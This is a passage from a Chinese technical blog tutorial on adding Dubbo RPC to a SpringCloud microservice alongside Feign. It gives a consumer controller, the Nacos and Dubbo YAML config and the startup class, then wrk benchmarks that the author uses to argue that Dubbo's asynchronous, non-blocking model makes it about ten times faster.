<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>tags <span class="token operator">=</span> <span class="token string">"Dubbo-RPC  完成远程调用"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserConsumerController</span> <span class="token punctuation">{<!-- --></span>


    <span class="token comment">//注入  @DubboReference 注解配置 所配置的 EchoClient 客户端Feign实例</span>
     <span class="token annotation punctuation">@DubboReference</span><span class="token punctuation">(</span>loadbalance <span class="token operator">=</span> <span class="token string">"groupLoadBalance"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">UserClient</span> userService<span class="token punctuation">;</span>

    <span class="token comment">//用户详情</span>
    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"用户详情接口"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/detail/v1"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDTO</span><span class="token punctuation">&gt;</span></span> <span class="token function">detail</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"userId"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">RestOut</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDTO</span><span class="token punctuation">&gt;</span></span> ret <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">detail</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="DubboNacos_3874"></a>消费者Dubbo+Nacos配置文件</h5> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">security</span><span class="token punctuation">:</span>
    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> dubbo<span class="token punctuation">-</span>consumer<span class="token punctuation">-</span>demo
<span class="token comment">#http://cdh1:18081/dubbo-consumer-demo/swagger-ui.html</span>

<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">18081</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /dubbo<span class="token punctuation">-</span>consumer<span class="token punctuation">-</span>demo

<span class="token comment">#### 暴露端点</span>
<span class="token key atrule">management</span><span class="token punctuation">:</span>
  <span class="token key atrule">endpoints</span><span class="token punctuation">:</span>
    <span class="token key atrule">web</span><span class="token punctuation">:</span>
      <span class="token key atrule">base-path</span><span class="token punctuation">:</span> <span class="token string">"/actuator"</span>  <span class="token comment"># 配置 Endpoint 的基础路径</span>
      <span class="token key atrule">exposure</span><span class="token punctuation">:</span>
        <span class="token key atrule">include</span><span class="token punctuation">:</span> <span class="token string">'*'</span>  <span class="token comment">#在yaml 文件属于关键字，所以需要加引号</span>
  <span class="token key atrule">endpoint</span><span class="token punctuation">:</span>
    <span class="token key atrule">health</span><span class="token punctuation">:</span>
      <span class="token key atrule">show-details</span><span class="token punctuation">:</span> always
  <span class="token key atrule">metrics</span><span class="token punctuation">:</span>
    <span class="token key atrule">tags</span><span class="token punctuation">:</span>
      <span class="token key atrule">application</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>spring.application.name<span class="token punctuation">}</span>
<span class="token comment">#  boot:</span>
<span class="token comment">#    admin:</span>
<span class="token comment">#      context-path: consumer</span>

<span class="token key atrule">dubbo</span><span class="token punctuation">:</span>
  <span class="token key atrule">scan</span><span class="token punctuation">:</span>
    <span class="token key atrule">base-packages</span><span class="token punctuation">:</span> com.crazymaker.cloud.dubbo
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span>  $<span class="token punctuation">{<!-- --></span>spring.application.name<span class="token punctuation">}</span>
  <span class="token key atrule">protocol</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> dubbo
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">-1</span>
  <span class="token key atrule">registry</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">parameters</span><span class="token punctuation">:</span>
      <span class="token key atrule">namespace</span><span class="token punctuation">:</span> dubbo
      <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">config-center</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">metadata-report</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
</code></pre> 
<h5><a id="_EnableDubbo__3935"></a>启动类 加上@EnableDubbo 注解</h5> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>starter</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">IpUtil</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableDubbo</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>actuate<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>security<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ManagementWebSecurityAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span></span><span class="token class-name">RedisAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span></span><span class="token class-name">RedisRepositoriesAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">DataSourceAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">DataSourceTransactionManagerAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>orm<span class="token punctuation">.</span>jpa<span class="token punctuation">.</span></span><span class="token class-name">HibernateJpaAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>security<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">SecurityAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>client<span class="token punctuation">.</span>discovery<span class="token punctuation">.</span></span><span class="token class-name">EnableDiscoveryClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>openfeign<span class="token punctuation">.</span></span><span class="token class-name">EnableFeignClients</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ConfigurableApplicationContext</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>core<span class="token punctuation">.</span>env<span class="token punctuation">.</span></span><span class="token class-name">Environment</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">springfox<span class="token punctuation">.</span>documentation<span class="token punctuation">.</span>swagger2<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">EnableSwagger2</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Inet4Address</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Optional</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@EnableSwagger2</span>
<span class="token annotation punctuation">@EnableDiscoveryClient</span>
<span class="token annotation punctuation">@Slf4j</span>
<span class="token annotation punctuation">@EnableDubbo</span>

<span class="token annotation punctuation">@SpringBootApplication</span><span class="token punctuation">(</span>
        scanBasePackages <span class="token operator">=</span>
                <span class="token punctuation">{<!-- --></span>
                        <span class="token string">"com.crazymaker.cloud.dubbo.demo"</span><span class="token punctuation">,</span>
                        <span class="token string">"com.crazymaker.springcloud.standard"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
        exclude <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">SecurityAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token comment">//排除db的自动配置</span>
                <span class="token class-name">DataSourceAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">DataSourceTransactionManagerAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">HibernateJpaAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">SecurityAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">ManagementWebSecurityAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token comment">//排除redis的自动配置</span>
                <span class="token class-name">RedisAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">RedisRepositoriesAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">//启动Feign</span>
<span class="token annotation punctuation">@EnableFeignClients</span><span class="token punctuation">(</span>basePackages <span class="token operator">=</span>
        <span class="token punctuation">{<!-- --></span><span class="token string">"com.crazymaker.cloud.dubbo.demo.consumer.client"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DubboConsumerApplication</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">ConfigurableApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">DubboConsumerApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">Environment</span> env <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> port <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> name <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"spring.application.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">String</span> path <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.servlet.context-path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                path <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Inet4Address</span><span class="token punctuation">&gt;</span></span> ip <span class="token operator">=</span> <span class="token class-name">IpUtil</span><span class="token punctuation">.</span><span class="token function">getLocalIp4Address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"\n----------------------------------------------------------\n\t"</span> <span class="token operator">+</span>
                    name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is running! Access URLs:\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"Local: \t\thttp://"</span> <span class="token operator">+</span> ip<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"swagger-ui: \thttp://"</span> <span class="token operator">+</span> ip<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/swagger-ui.html\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"actuator: \thttp://"</span> <span class="token operator">+</span> ip<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/actuator/info\n\t"</span> <span class="token operator">+</span>
                    <span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"服务启动报错"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="_Consumer_4019"></a>启动、体验 Consumer</h5> 
<p>打包之后，在 咱们优雅的虚拟机 centos8 中，优雅的启动一下,</p> 
<p>来一个优雅的启动命令</p> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>root@centos1 bin<span class="token punctuation">]</span><span class="token comment"># cd ../../dubbo-consumer-demo-1.0-SNAPSHOT/bin/</span>
<span class="token punctuation">[</span>root@centos1 bin<span class="token punctuation">]</span><span class="token comment"># sh ./deploy.sh start</span>
PORT:18081
JVM:-server -Xms512m -Xmx2048m
<span class="token function">nohup</span> java -server -Xms512m -Xmx2048m -Dserver.port<span class="token operator">=</span><span class="token number">18081</span>   -jar /work/dubbo-consumer-demo-1.0-SNAPSHOT/lib/dubbo-consumer-demo-1.0-SNAPSHOT.jar com.crazymaker.cloud.dubbo.demo.consumer.starter.DubboConsumerApplication  <span class="token operator">&amp;</span>
nohup: appending output to <span class="token string">'nohup.out'</span>
</code></pre> 
<p>太爽… 有个vagrant+Centos 开发环境， 开发Java应用，爽到不要不要的</p> 
<p>关键是： 在这个虚拟机 box 文件中，尼恩给大家预装了K8S 云原生环境，大家一键导入省了N多麻烦。</p> 
<p>下一步，基于这个环境， 咱们就开始 “左手大数据、右手云原生” 的高端实操</p> 
<p>继续看，屏幕的下面，下面还有swagger体验地址</p> 
<p><img src="https://images2.imgbox.com/e5/74/N3Gj7jcT_o.png" alt=""></p> 
<p>使用这个地址，可以在浏览器开起Swagger -UI 的界面</p> 
<p>http:///10.0.2.15:18081/dubbo-consumer-demo/swagger-ui.html</p> 
<p>注意，要修改一下 host，修改之后为</p> 
<p>http://cdh1:18081/dubbo-consumer-demo/swagger-ui.html</p> 
<p>Feign 和Dubbo 两大RPC调用 并存的效果，如下：</p> 
<p><img src="https://images2.imgbox.com/81/94/CEPRjQ7R_o.png" alt=""></p> 
<h5><a id="NacosDubbo_4062"></a>在Nacos查看Dubbo服务的注册情况</h5> 
<p>通过nacos，可以看到 dubbo的服务的消费者啦</p> 
<p><img src="https://images2.imgbox.com/56/62/wdh1d2Ss_o.png" alt=""></p> 
<p>具体的细节，咱们后面讲dubbo视频的时候，再说</p> 
<p>这里先把性能优化起来</p> 
<h4><a id="FeignDubbo_4074"></a>Feign+Dubbo性能的对比测试</h4> 
<p>然后进行了性能的对比验证</p> 
<p><strong>dubbo 的压测数据</strong></p> 
<pre><code class="prism language-bash">wrk -t8 -c200 -d30s --latency  http://cdh1:18081/dubbo-consumer-demo/user/detail/v1?userId<span class="token operator">=</span><span class="token number">1</span>

<span class="token punctuation">[</span>root@centos1 src<span class="token punctuation">]</span><span class="token comment"># wrk -t8 -c200 -d30s --latency  http://cdh1:18081/dubbo-consumer-demo/user/detail/v1?userId=1</span>
Running 30s <span class="token builtin class-name">test</span> @ http://cdh1:18081/dubbo-consumer-demo/user/detail/v1?userId<span class="token operator">=</span><span class="token number">1</span>
  <span class="token number">8</span> threads and <span class="token number">200</span> connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency    <span class="token number">30</span>.10ms   <span class="token number">45</span>.68ms <span class="token number">644</span>.45ms   <span class="token number">95.43</span>%
    Req/Sec     <span class="token number">1</span>.12k   <span class="token number">465.63</span>     <span class="token number">2</span>.36k    <span class="token number">66.87</span>%
  Latency Distribution
     <span class="token number">50</span>%   <span class="token number">18</span>.94ms
     <span class="token number">75</span>%   <span class="token number">28</span>.43ms
     <span class="token number">90</span>%   <span class="token number">46</span>.21ms
     <span class="token number">99</span>%  <span class="token number">283</span>.56ms
  <span class="token number">264316</span> requests <span class="token keyword">in</span> <span class="token number">30</span>.07s, <span class="token number">148</span>.47MB <span class="token builtin class-name">read</span>
Requests/sec:   <span class="token number">8788.96</span>
Transfer/sec:      <span class="token number">4</span>.94MB
</code></pre> 
<p><img src="https://images2.imgbox.com/4d/ec/rrqpeWBo_o.png" alt=""></p> 
<p><strong>feign 的压测数据</strong></p> 
<p><img src="https://images2.imgbox.com/d9/80/Spfh6NOY_o.png" alt=""></p> 
<pre><code class="prism language-bash">wrk -t8 -c200 -d30s --latency  http://cdh1:18081/dubbo-consumer-demo/echo/variable/11

<span class="token punctuation">[</span>root@centos1 src<span class="token punctuation">]</span><span class="token comment"># wrk -t8 -c200 -d30s --latency  http://cdh1:18081/dubbo-consumer-demo/echo/variable/11</span>
Running 30s <span class="token builtin class-name">test</span> @ http://cdh1:18081/dubbo-consumer-demo/echo/variable/11
  <span class="token number">8</span> threads and <span class="token number">200</span> connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency   <span class="token number">321</span>.50ms  <span class="token number">294</span>.59ms   <span class="token number">2</span>.00s    <span class="token number">61.77</span>%
    Req/Sec    <span class="token number">87.18</span>     <span class="token number">43.39</span>   <span class="token number">232.00</span>     <span class="token number">67.00</span>%
  Latency Distribution
     <span class="token number">50</span>%  <span class="token number">309</span>.06ms
     <span class="token number">75</span>%  <span class="token number">503</span>.06ms
     <span class="token number">90</span>%  <span class="token number">687</span>.99ms
     <span class="token number">99</span>%    <span class="token number">1</span>.21s
  <span class="token number">20495</span> requests <span class="token keyword">in</span> <span class="token number">30</span>.10s, <span class="token number">7</span>.64MB <span class="token builtin class-name">read</span>
  Socket errors: connect <span class="token number">0</span>, <span class="token builtin class-name">read</span> <span class="token number">0</span>, <span class="token function">write</span> <span class="token number">0</span>, <span class="token function">timeout</span> <span class="token number">49</span>
Requests/sec:    <span class="token number">680.90</span>
Transfer/sec:    <span class="token number">259</span>.99KB
</code></pre> 
<p><strong>从数据来看， dubbo rpc 是feign rpc 性能10倍</strong></p> 
<h5><a id="DubboFeign10_4131"></a>Dubbo比Feign高10倍以上的本质</h5> 
<p>Dubbo比Feign高10倍以上的本质，不是在于应用层的协议，和传输格式</p> 
<p>面试的时候，太多的小伙伴被问到： Dubbo比Feign性能高，说说原因。</p> 
<p>小伙伴首先回答的是：</p> 
<p><em>Dubbo 是TCP 层的传输协议，Feign是应用层 的HTTP传输协议，所以性能低。</em></p> 
<p>这个答案不是本质原因，HTTP是有些冗余的头部报文，但是不至于差10倍。能差0.5倍，就已经顶天了。</p> 
<p>差10倍的原因：是 同步链路 与异步链路 的 区别。</p> 
<p>或者说：<em>Dubbo比Feign高10倍以上的本质，是RPC 调用异步化</em></p> 
<p>RPC 调用主要的框架有：</p> 
<p><img src="https://images2.imgbox.com/12/73/wv7SwYSF_o.png" alt=""></p> 
<p>特点是：</p> 
<ul><li>feign 是同步IO 、阻塞模式的同步 RPC框架</li><li>dubbo 是基于Netty的非阻塞IO + Reactor 反应堆线程模型的 异步RPC框架</li></ul> 
<p>异步RPC 调用，等待upstream 上游 response 返回时，线程不处于block 状态</p> 
<p>作为微服务架构中数据流量最大的一部分，RPC 调用异步化的收益巨大；</p> 
<p>dubbo 的异步RPC，仅仅 SpringCloud 微服务全链路 异步的一个环节， SpringCloud 全链路 异步有5个以上的环节。</p> 
<p>有关 微服务全链路 异步高性能改造，请参考尼恩的深度文章：</p> 
<p><a href="https://blog.csdn.net/crazymakercircle/article/details/129004814">全链路异步，让你的 SpringCloud 性能优化10倍+</a></p> 
<p>高并发、云原生、大数据时代，很多组件都是 全异步的、响应式的。</p> 
<p>大家一定要掌握全链路异步的底层原理，掌握好 响应式编程的底层原理和实操，为 “左手大数据、右手云原生” 做好技术准备。</p> 
<p>后面尼恩也会写一些列的博文，为大家“左手大数据、右手云原生” 做好技术储备。</p> 
<p>具体请关注尼恩的疯狂创客圈社群（50+）。</p> 
<h5><a id="Dubbo__SpringCloud__Openfeign_4184"></a>Dubbo 与 SpringCloud 的通信 Openfeign的区别</h5> 
<h6><a id="1_4186"></a>1、协议支持方面</h6> 
<ul><li>Feign更加优雅简单。<br> Feign是通过REST API实现的远程调用，基于Http传输协议，服务提供者需要对外暴露Http接口供消费者调用，服务粒度是http接口级的。<br> 很多文章说：通过短连接的方式进行通信，不适合高并发的访问。<br> <em>尼恩纠错： Feign 并不是短链接，而是长连接 ，具体请 阅读 尼恩 的《Java 高并发核心编程 卷1 加强版》</em></li><li>Dubbo方式更灵活。<br> Dubbo是通过RPC调用实现的远程调用，支持多传输协议(Dubbo、Rmi、http、redis等等)，可以根据业务场景选择最佳的方式，非常灵活。<br> 默认的Dubbo协议：利用Netty，TCP传输，单一、异步、长连接，适合数据量小、高并发和服务提供者远远少于消费者的场景。Dubbo通过TCP长连接的方式进行通信，服务粒度是方法级的。</li></ul> 
<h6><a id="2_4196"></a>2、通信性能方面</h6> 
<ul><li>Feign基于Http传输协议，底层实现是rest。在高并发场景下性能不够理想。</li><li>Dubbo框架的通信协议采用RPC协议，属于传输层协议，提升了交互的性能，保持了长连接，高性能。</li></ul> 
<h6><a id="3_4201"></a>3、线程模型方面</h6> 
<ul><li>Feign使用的是阻塞式的线程模型， 在请求和响应直之间， IO线程是阻塞的，死等到超时。</li><li>Dubbo使用的是异步非阻塞式的线程模型（Netty的Reactor反应器）， 在请求和响应直之间， IO线程是非阻塞的，有限的线程，可以处理大量的请求。</li></ul> 
<p>这点是性能的核心。</p> 
<h4><a id="SpringCloud__Dubbo_RPC__4210"></a>SpringCloud + Dubbo RPC 的集成价值</h4> 
<p>高并发时代来了， 各大项目有越来越强烈的诉求，全链路异步， 是性能优化的一个杀手锏。</p> 
<p>使用Dubbo来替换Feign，足足可以提升10倍性能。</p> 
<p>所以，SpringCloud + Dubbo RPC 的集成 是一个比较刚性的需求。</p> 
<p>有小伙伴查招聘网站，发现很多需要有SpringCloud + Dubbo 的集成经验，刚好印证了这点。</p> 
<p>尼恩强烈建议大家，做一下 SpringCloud + Dubbo RPC 的集成，在同一个微服务下，同时使用了Feign + Dubbo。</p> 
